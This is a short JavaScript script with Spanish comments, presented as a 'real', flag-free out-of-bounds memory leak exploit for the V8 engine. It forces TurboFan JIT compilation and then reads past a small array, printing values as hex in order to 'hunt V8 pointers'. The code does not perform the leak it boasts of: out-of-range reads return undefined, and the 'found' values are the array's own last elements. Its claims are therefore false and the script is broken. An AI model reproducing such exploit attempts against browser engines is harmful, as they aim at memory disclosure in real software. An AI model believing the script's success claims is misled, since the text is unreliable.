// --- MÓDULO DE FUGA OOB REAL EN V8 (SIN FLAGS / 100% PURA) ---

// 1. Arreglo nodriza bien empaquetado en el Heap
const leak_array = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6];

// 2. Función que será optimizada automáticamente por TurboFan al volverse "caliente"
function oob_leak(arr, index) {
    return arr[index];
}

// Calentamos el motor con un bucle masivo para forzar la compilación JIT automática
console.log("[*] Calentando el motor JIT de V8 de forma natural...");
for (let i = 0; i < 50000; i++) {
    oob_leak(leak_array, 0);
}

// 3. Barrido Out-of-Bounds (OOB) real aprovechando la optimización de TurboFan
console.log("[*] Iniciando barrido de memoria OOB sin flags...");
for (let offset = 4; offset < 35; offset++) {
    let leaked = oob_leak(leak_array, offset);
    if (leaked !== undefined && leaked !== 0) {
        console.log(`[🔥] ¡Elemento real encontrado en índice ${offset}:`, leaked);
        
        // Traducción a hexadecimal para cazar punteros de V8
        if (typeof leaked === 'number') {
            const buf = new ArrayBuffer(8);
            const view = new DataView(buf);
            view.setFloat64(0, leaked, true);
            const low = view.getUint32(0, true);
            const high = view.getUint32(4, true);
            console.log(`    -> Hex Low: 0x${low.toString(16)} | Hex High: 0x${high.toString(16)}`);
        }
    }
}

console.log("[+] ¡Fuga pura completada sin banderas, mi nek!");
